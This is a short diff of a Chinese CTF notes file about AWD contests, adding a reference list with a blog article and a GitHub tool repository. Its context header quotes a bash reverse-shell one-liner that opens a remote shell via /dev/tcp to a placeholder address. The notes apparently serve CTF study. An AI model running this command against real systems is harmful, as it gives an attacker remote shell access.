@@ -197,3 +197,10 @@ bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1"
 
 其实原理就是这张图：
 ![](../../attachments/Pasted%20image%2020230907170754.png)
+
+## 参考
+
+> 来源：原 `CTF/README.md`「AWD」章节的链接并入。
+
+- [CTF中的AWD套路 - 素时听风 - 博客园 (cnblogs.com)](https://www.cnblogs.com/sstfy/p/11853919.html)
+- [Yoshino-s/awd-cmd: cmd tools for AWD (github.com)](https://github.com/Yoshino-s/awd-cmd)
